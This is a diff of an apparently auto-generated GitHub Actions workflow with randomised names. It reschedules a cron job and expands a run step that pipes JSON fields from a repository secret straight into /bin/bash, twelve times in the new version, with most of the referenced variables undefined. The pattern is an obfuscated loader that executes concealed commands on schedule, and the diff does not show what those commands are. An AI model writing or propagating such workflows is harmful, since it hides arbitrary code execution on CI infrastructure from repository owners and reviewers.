@@ -1,11 +1,10 @@
 name: chiyidalkk
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 4/6 * * *'
+    - cron: '39 5/6 * * *'
 
-jobs:  # 18532
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,11 +12,18 @@ jobs:  # 18532
       - uses: actions/checkout@v4
       - name: chiyidalkk
         env:
-          mkzql28069: ${{ secrets.mkzql28069 }}
+          cs37751: ${{ secrets.cs37751 }}
         run: |
-          echo $mkzql28069 | jq -r .tab95575 | /bin/bash
-          echo $b7 | jq -r .oaqp79 | /bin/bash
-          echo $uzaw93603 | jq -r .j1 | /bin/bash
-          echo $vbt9710 | jq -r .xrd4802 | /bin/bash
-          echo $axs6060 | jq -r .hkest1 | /bin/bash
+          echo $cs37751 | jq -r .j80 | /bin/bash
+          echo $sbio9 | jq -r .ck03629 | /bin/bash
+          echo $lnaw38999 | jq -r .cfqjh1 | /bin/bash
+          echo $s707 | jq -r .mg97161 | /bin/bash
+          echo $qdt82325 | jq -r .ns1337 | /bin/bash
+          echo $skkjc5 | jq -r .a2683 | /bin/bash
+          echo $fko301 | jq -r .bnuwx9 | /bin/bash
+          echo $dca6821 | jq -r .cvil98079 | /bin/bash
+          echo $z7328 | jq -r .js597 | /bin/bash
+          echo $grv7208 | jq -r .p7140 | /bin/bash
+          echo $cfdg4450 | jq -r .z7272 | /bin/bash
+          echo $rx15660 | jq -r .eudrw3 | /bin/bash
 
